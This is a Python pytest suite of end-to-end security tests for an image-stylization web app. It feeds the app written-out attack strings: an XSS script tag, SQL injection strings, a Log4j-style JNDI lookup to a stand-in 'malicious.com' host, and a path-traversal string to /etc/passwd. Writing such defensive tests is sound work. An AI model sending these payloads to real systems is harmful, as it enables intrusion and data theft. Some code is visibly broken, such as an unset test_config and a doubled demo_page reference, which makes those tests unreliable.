"""
E2E tests for security and abuse prevention features.

Tests various security measures and abuse prevention systems.
"""
import asyncio
import base64

import pytest

from tests.e2e.pages.demo_page import DemoPage


@pytest.mark.integration
@pytest.mark.security
class TestSecurityFeatures:
    """Test security and abuse prevention measures."""

    @pytest.fixture(autouse=True)
    def setup(self, webdriver_instance, test_config, test_data_manager, api_client):
        """Set up test environment."""
        self.driver = webdriver_instance
        self.base_url = test_config.base_url
        self.test_data = test_data_manager
        self.api_client = api_client
        self.demo_page = DemoPage(self.driver, self.base_url)

    async def test_trial_abuse_prevention(self):
        """Test trial abuse prevention measures."""
        # Test rapid trial session creation
        rapid_sessions = []

        for _i in range(10):  # Attempt to create many trial sessions rapidly
            try:
                response = await self.api_client.start_trial_session()
                rapid_sessions.append(response)
            except Exception:
                # Rate limiting might cause exceptions
                pass

            # Small delay to not overwhelm
            await asyncio.sleep(0.1)

        # Should have some rate limiting in place
        successful_sessions = [r for r in rapid_sessions if r.status_code == 200]
        rate_limited_sessions = [r for r in rapid_sessions if r.status_code == 429]

        # Should either limit the number of sessions or rate limit
        assert len(successful_sessions) <= 5 or len(rate_limited_sessions) > 0

    def test_device_fingerprinting_basic(self):
        """Test basic device fingerprinting functionality."""
        if not self.test_config.test_security_features:
            pytest.skip("Security testing disabled")

        self.demo_page.navigate_to_demo()

        # Check if fingerprinting script is loaded
        fingerprint_script = self.demo_page.execute_javascript(
            "return typeof window.getFingerprint === 'function'"
        )

        if fingerprint_script:
            # If fingerprinting is enabled, test it
            fingerprint = self.demo_page.execute_javascript(
                "return window.getFingerprint ? window.getFingerprint() : null"
            )

            assert fingerprint is not None, "Should generate device fingerprint"
            assert len(str(fingerprint)) > 0, "Fingerprint should not be empty"

    async def test_rate_limiting_behavior(self):
        """Test various rate limiting scenarios."""
        if not self.test_config.rate_limit_test_enabled:
            pytest.skip("Rate limiting tests disabled")

        # Test API rate limiting
        image_data = base64.b64decode(self.test_data.get_test_images()["valid_jpeg"])

        # Create trial session first
        trial_response = await self.api_client.start_trial_session()
        if trial_response.status_code != 200:
            pytest.skip("Could not create trial session")

        session_id = trial_response.json()["session_id"]

        # Make rapid requests
        rapid_requests = []
        for i in range(10):
            task = self.api_client.stylize_image(
                image_data=image_data,
                style_id="van_gogh",
                session_id=session_id,
                user_prompt=f"Rate limit test {i}"
            )
            rapid_requests.append(task)

        responses = await asyncio.gather(*rapid_requests, return_exceptions=True)

        # Count different response types
        successful = 0
        rate_limited = 0
        errors = 0

        for response in responses:
            if isinstance(response, Exception):
                errors += 1
            elif response.status_code == 200:
                successful += 1
            elif response.status_code == 429:
                rate_limited += 1
            else:
                errors += 1

        # Should have some rate limiting or trial limits
        assert rate_limited > 0 or successful <= 5, "Should enforce some limits"

    async def test_content_policy_enforcement(self):
        """Test content policy violation handling."""
        trial_response = await self.api_client.start_trial_session()
        if trial_response.status_code != 200:
            pytest.skip("Could not create trial session")

        session_id = trial_response.json()["session_id"]

        # Test potentially problematic content
        problematic_prompts = [
            "inappropriate content test",
            "violence and harmful content",
            "adult content request"
        ]

        image_data = base64.b64decode(self.test_data.get_test_images()["valid_jpeg"])

        for prompt in problematic_prompts:
            response = await self.api_client.stylize_image(
                image_data=image_data,
                style_id="van_gogh",
                session_id=session_id,
                user_prompt=prompt
            )

            # Should either block or sanitize
            if response.status_code == 400:
                error_data = response.json()
                assert any(word in str(error_data).lower()
                          for word in ["content", "policy", "inappropriate"])
            elif response.status_code == 200:
                # Content was processed (possibly sanitized)
                result = response.json()
                assert "stylized_image_url" in result

    def test_web_ui_security_headers(self):
        """Test security headers in web responses."""
        self.demo_page.navigate_to_demo()

        # Check for basic security via JavaScript
        # (In a real test, you'd check HTTP headers)

        # Test that sensitive operations require user interaction
        generate_button = self.demo_page.find_element(self.demo_page.GENERATE_BUTTON)
        assert generate_button is not None

        # Test that file input is properly sandboxed
        self.demo_page.find_element(self.demo_page.FILE_INPUT)
        file_type = self.demo_page.get_attribute(self.demo_page.FILE_INPUT, "accept")

        if file_type:
            assert "image" in file_type, "Should only accept image files"

    async def test_session_security(self):
        """Test session security measures."""
        # Test session timeout behavior
        trial_response = await self.api_client.start_trial_session()
        session_data = trial_response.json()
        session_id = session_data["session_id"]

        # Check session immediately
        status_response = await self.api_client.check_trial_status(session_id)
        assert status_response.status_code == 200

        # Test with very old/invalid session format
        invalid_sessions = [
            "invalid-session-format",
            "",
            "session-" + "x" * 100,  # Too long
            "session-with-special-chars!@#$"
        ]

        for invalid_session in invalid_sessions:
            response = await self.api_client.check_trial_status(invalid_session)
            assert response.status_code in [400, 404, 401]

    def test_xss_prevention(self):
        """Test XSS prevention in web interface."""
        self.demo_page.navigate_to_demo()

        # Test XSS in prompt field
        xss_payload = "<script>alert('xss')</script>"

        self.demo_page.enter_prompt(xss_payload)
        prompt_value = self.demo_page.get_prompt_value()

        # Should either sanitize or escape the input
        assert "<script>" not in prompt_value or prompt_value != xss_payload

        # Check that no alert dialog appears
        try:
            alert = self.driver.switch_to.alert
            alert.dismiss()
            pytest.fail("XSS payload executed - alert dialog appeared")
        except:
            # No alert is good - XSS was prevented
            pass

    async def test_injection_prevention(self):
        """Test SQL injection and other injection prevention."""
        trial_response = await self.api_client.start_trial_session()
        session_id = trial_response.json()["session_id"]

        # Test SQL injection attempts in prompts
        injection_payloads = [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "1' UNION SELECT * FROM admin_users --",
            "${jndi:ldap://malicious.com/exploit}"  # Log4j style
        ]

        image_data = base64.b64decode(self.test_data.get_test_images()["valid_jpeg"])

        for payload in injection_payloads:
            response = await self.api_client.stylize_image(
                image_data=image_data,
                style_id="van_gogh",
                session_id=session_id,
                user_prompt=payload
            )

            # Should handle malicious input safely
            assert response.status_code in [200, 400]

            if response.status_code == 200:
                result = response.json()
                # Should not expose any system information
                assert "error" not in result.get("stylized_image_url", "")

    def test_file_upload_security(self):
        """Test file upload security measures."""
        if not self.test_config.test_security_features:
            pytest.skip("Security testing disabled")

        self.demo_page.navigate_to_demo()

        # Test that only image files are accepted
        file_input = self.demo_page.find_element(self.demo_page.FILE_INPUT)
        accept_attribute = file_input.get_attribute("accept")

        if accept_attribute:
            assert "image" in accept_attribute
            assert "text" not in accept_attribute
            assert "application" not in accept_attribute

    async def test_authentication_bypass_attempts(self):
        """Test attempts to bypass authentication."""
        # Test with malformed API keys
        malformed_keys = [
            "invalid-key",
            "",
            "Bearer fake-token",
            "admin",
            "../../../etc/passwd"
        ]

        image_data = base64.b64decode(self.test_data.get_test_images()["valid_jpeg"])

        for malformed_key in malformed_keys:
            # Create client with malformed key
            auth_client = self.api_client
            auth_client.api_key = malformed_key

            response = await auth_client.stylize_image(
                image_data=image_data,
                style_id="van_gogh",
                user_prompt="Auth bypass test"
            )

            # Should reject invalid authentication
            assert response.status_code in [401, 403, 400]

    async def test_dos_prevention(self):
        """Test denial of service prevention."""
        # Test with extremely large payloads
        large_prompt = "x" * 10000  # Very large prompt

        trial_response = await self.api_client.start_trial_session()
        if trial_response.status_code != 200:
            pytest.skip("Could not create trial session")

        session_id = trial_response.json()["session_id"]

        image_data = base64.b64decode(self.test_data.get_test_images()["valid_jpeg"])

        response = await self.api_client.stylize_image(
            image_data=image_data,
            style_id="van_gogh",
            session_id=session_id,
            user_prompt=large_prompt
        )

        # Should handle large payloads gracefully
        assert response.status_code in [200, 400, 413]  # 413 = Payload Too Large

        if response.status_code == 400:
            error_data = response.json()
            assert any(word in str(error_data).lower()
                      for word in ["size", "large", "limit"])


@pytest.mark.integration
@pytest.mark.security
@pytest.mark.web_ui
class TestWebUISecurityFeatures:
    """Test security features specific to web interface."""

    @pytest.fixture(autouse=True)
    def setup(self, webdriver_instance, test_config):
        """Set up web driver."""
        self.driver = webdriver_instance
        self.base_url = test_config.base_url
        self.demo_page = DemoPage(self.driver, self.base_url)

    def test_clickjacking_prevention(self):
        """Test clickjacking prevention measures."""
        self.demo_page.navigate_to_demo()

        # Test that page cannot be embedded in iframe
        # (This would require checking X-Frame-Options header in real test)

        # Test that sensitive buttons require direct user interaction
        generate_button = self.demo_page.find_element(self.demo_page.GENERATE_BUTTON)

        # Button should be visible and interactable
        assert generate_button.is_displayed()
        assert generate_button.is_enabled()

    def test_csrf_prevention(self):
        """Test CSRF prevention measures."""
        self.demo_page.navigate_to_demo()

        # Check for CSRF tokens in forms
        # (In a real implementation, you'd check for CSRF tokens)

        # Test that forms require proper submission
        form = self.demo_page.find_element((self.demo_page.demo_page.By.TAG_NAME, "form"))
        if form:
            # Form should have proper security attributes
            method = form.get_attribute("method")
            if method:
                assert method.upper() in ["POST", "GET"]

    def test_sensitive_data_exposure(self):
        """Test that sensitive data is not exposed in client."""
        self.demo_page.navigate_to_demo()

        # Check that no sensitive information is in page source
        page_source = self.driver.page_source.lower()

        sensitive_patterns = [
            "api_key",
            "secret",
            "password",
            "private_key",
            "auth_token"
        ]

        for pattern in sensitive_patterns:
            assert pattern not in page_source, f"Sensitive pattern '{pattern}' found in page source"

    def test_client_side_validation(self):
        """Test client-side validation and security."""
        self.demo_page.navigate_to_demo()

        # Test that client-side validation exists but doesn't rely solely on it
        file_input = self.demo_page.find_element(self.demo_page.FILE_INPUT)

        # Should have proper file type restrictions
        accept_attr = file_input.get_attribute("accept")
        if accept_attr:
            assert "image" in accept_attr

        # Test that prompt input has reasonable limits
        prompt_input = self.demo_page.find_element(self.demo_page.PROMPT_INPUT)
        max_length = prompt_input.get_attribute("maxlength")

        if max_length:
            assert int(max_length) < 10000, "Prompt should have reasonable length limit"
